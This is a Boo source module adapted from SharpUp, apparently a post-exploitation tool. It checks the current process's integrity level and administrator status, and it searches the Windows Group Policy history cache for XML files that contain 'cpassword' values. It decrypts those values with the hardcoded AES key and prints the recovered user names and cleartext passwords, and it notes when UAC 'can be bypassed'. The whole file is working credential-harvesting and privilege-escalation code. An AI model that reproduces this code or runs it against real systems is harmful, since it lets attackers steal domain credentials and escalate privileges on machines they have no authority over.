/*
    This module is adapted from SharpUp (https://github.com/GhostPack/SharpUp)
*/
import System
import System.IO
import System.Security.AccessControl
import System.Security.Claims
import System.Security.Cryptography
import System.Security.Principal
import System.ServiceProcess
import System.Reflection
import System.Runtime.InteropServices
import System.Xml


public static def IsHighIntegrity() as bool:
    identity = WindowsIdentity.GetCurrent()
    principal = WindowsPrincipal(identity)
    return principal.IsInRole(WindowsBuiltInRole.Administrator)


public static def isAdmin() as bool:
    identity as WindowsIdentity = WindowsIdentity.GetCurrent()
    if (identity != null):
        principal as WindowsPrincipal = WindowsPrincipal(identity)
        list = principal.UserClaims
        for c in list:
            if c.Value.Contains("S-1-5-32-544"):
                return true
    return false


public static def FindFiles(path as string, patterns as string) as List:
    // finds files matching one or more patterns under a given path, recursive
    // adapted from http://csharphelper.com/blog/2015/06/find-files-that-match-multiple-patterns-in-c/
    //      pattern: "*pass*;*.png;"

    files as List
    try:
        // search every pattern in this directory's files
        for pattern as string in (@/;/.Split(patterns)):
            for f as string in Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly):
                if f:
                    files.Add(f)

        // go recurse in all sub-directories
        for directory in Directory.GetDirectories(path):
            if directory:
                newfiles as List = FindFiles(directory, patterns)
                if newfiles:
                    files += newfiles
    except e as UnauthorizedAccessException:
        pass
    except e as PathTooLongException:
        pass

    return files


public static def DecryptGPP(cpassword as string) as string:
    mod as int = cpassword.Length % 4

    if mod == 1:
        cpassword = cpassword.Substring(0, cpassword.Length - 1)
    elif mod == 2:
        cpassword += "=="
    elif mod == 3:
        cpassword += "="

    base64decoded as (byte) = Convert.FromBase64String(cpassword)

    aesObject as AesCryptoServiceProvider

    aesKey = array(byte, (0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b))
    aesIV as (byte)

    aesObject.IV = aesIV
    aesObject.Key = aesKey

    aesDecryptor as ICryptoTransform = aesObject.CreateDecryptor()
    outBlock as (byte) = aesDecryptor.TransformFinalBlock(base64decoded, 0, base64decoded.Length)

    return System.Text.UnicodeEncoding.Unicode.GetString(outBlock)


public static def GetCachedGPPPassword() as void:
    try:
        print "\r\n=== Cached GPP Password ===\r\n"

        allUsers as string = System.Environment.GetEnvironmentVariable("ALLUSERSPROFILE")

        if not allUsers.Contains("ProgramData"):
            // Before Windows Vista, the default value of AllUsersProfile was "C:\Documents and Settings\All Users"
            // And after, "C:\ProgramData"
            allUsers += "\\Application Data"
        allUsers += "\\Microsoft\\Group Policy\\History" // look only in the GPO cache folder

        files as List = FindFiles(allUsers, "*.xml")

        // files will contain all XML files
        for file as string in files:
            if (not(file.Contains("Groups.xml") or file.Contains("Services.xml")
                or file.Contains("Scheduledtasks.xml") or file.Contains("DataSources.xml")
                or file.Contains("Printers.xml") or file.Contains("Drives.xml"))):
                continue // uninteresting XML files, move to next

            xmlDoc as XmlDocument
            xmlDoc.Load(file)

            if (not xmlDoc.InnerXml.Contains("cpassword")):
                continue // no "cpassword" => no interesting content, move to next

            print "\r\n" + file

            cPassword as string = ""
            UserName as string = ""
            NewName as string = ""
            Changed as string = ""
            a as XmlNode
            b as XmlNode
            if (file.Contains("Groups.xml")):
                a = xmlDoc.SelectSingleNode("/Groups/User/Properties")
                b = xmlDoc.SelectSingleNode("/Groups/User")
                for attr as XmlAttribute in a.Attributes:
                    if (attr.Name.Equals("cpassword")):
                        cPassword = attr.Value
                    if (attr.Name.Equals("userName")):
                        UserName = attr.Value
                    if (attr.Name.Equals("newName")):
                        NewName = attr.Value
                for attr as XmlAttribute in b.Attributes:
                    if (attr.Name.Equals("changed")):
                        Changed = attr.Value
                //print "\r\nA{0}", a.Attributes[0].Value);
            elif (file.Contains("Services.xml")):
                a = xmlDoc.SelectSingleNode("/NTServices/NTService/Properties")
                b = xmlDoc.SelectSingleNode("/NTServices/NTService")
                for attr as XmlAttribute in a.Attributes:
                    if (attr.Name.Equals("cpassword")):
                        cPassword = attr.Value
                    if (attr.Name.Equals("accountName")):
                        UserName = attr.Value
                for attr as XmlAttribute in b.Attributes:
                    if (attr.Name.Equals("changed")):
                        Changed = attr.Value
            elif (file.Contains("Scheduledtasks.xml")):
                a = xmlDoc.SelectSingleNode("/ScheduledTasks/Task/Properties")
                b = xmlDoc.SelectSingleNode("/ScheduledTasks/Task")
                for attr as XmlAttribute in a.Attributes:
                    if (attr.Name.Equals("cpassword")):
                        cPassword = attr.Value
                    if (attr.Name.Equals("runAs")):
                        UserName = attr.Value
                for attr as XmlAttribute in b.Attributes:
                    if (attr.Name.Equals("changed")):
                        Changed = attr.Value
            elif (file.Contains("DataSources.xml")):
                a = xmlDoc.SelectSingleNode("/DataSources/DataSource/Properties")
                b = xmlDoc.SelectSingleNode("/DataSources/DataSource")
                for attr as XmlAttribute in a.Attributes:
                    if (attr.Name.Equals("cpassword")):
                        cPassword = attr.Value
                    if (attr.Name.Equals("username")):
                        UserName = attr.Value
                for attr as XmlAttribute in b.Attributes:
                    if (attr.Name.Equals("changed")):
                        Changed = attr.Value
            elif (file.Contains("Printers.xml")):
                a = xmlDoc.SelectSingleNode("/Printers/SharedPrinter/Properties")
                b = xmlDoc.SelectSingleNode("/Printers/SharedPrinter")
                for attr as XmlAttribute in a.Attributes:
                    if (attr.Name.Equals("cpassword")):
                        cPassword = attr.Value
                    if (attr.Name.Equals("username")):
                        UserName = attr.Value
                for attr as XmlAttribute in b.Attributes:
                    if (attr.Name.Equals("changed")):
                        Changed = attr.Value
            else:
                // Drives.xml
                a = xmlDoc.SelectSingleNode("/Drives/Drive/Properties")
                b = xmlDoc.SelectSingleNode("/Drives/Drive")
                for attr as XmlAttribute in a.Attributes:
                    if (attr.Name.Equals("cpassword")):
                        cPassword = attr.Value
                    if (attr.Name.Equals("username")):
                        UserName = attr.Value
                for attr as XmlAttribute in b.Attributes:
                    if (attr.Name.Equals("changed")):
                        Changed = attr.Value

            if (UserName.Equals("")):
                UserName = "[BLANK]"

            if (NewName.Equals("")):
                NewName = "[BLANK]"

            if (cPassword.Equals("")):
                cPassword = "[BLANK]"
            else:
                cPassword = DecryptGPP(cPassword)

            if (Changed.Equals("")):
                Changed = "[BLANK]"

            print "UserName: " + UserName
            print "NewName: " + NewName
            print "cPassword: " + cPassword
            print "Changed: " + Changed
    except ex:
        print String.Format("  [X] Exception: {0}", ex.Message)


public static def Main():
    if IsHighIntegrity():
        print "[*] Already in high integrity, no need to privesc!"
    elif isAdmin():
        print "[*] In medium integrity but user is a local administrator - UAC can be bypassed."
    else:
        GetCachedGPPPassword()
